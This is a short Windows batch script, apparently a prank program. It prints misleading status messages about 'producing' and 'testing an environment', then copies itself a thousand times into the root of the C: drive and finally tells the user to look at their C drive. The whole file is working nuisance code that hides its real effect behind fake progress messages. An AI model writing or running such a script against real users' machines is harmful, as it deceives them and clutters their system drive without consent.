@echo off
ping -n 4 127.0.0.1>nul
echo produce begin...
ping -n 3 127.0.0.1>nul
echo test enviroment...
set count=0
:loop1
set/a count+=1
if %count% gtr 1000 goto :end
copy 批处理.bat C:\复制体%count%号.bat >nul
goto :loop1
:end
echo 看看你的C盘
pause >nul
exit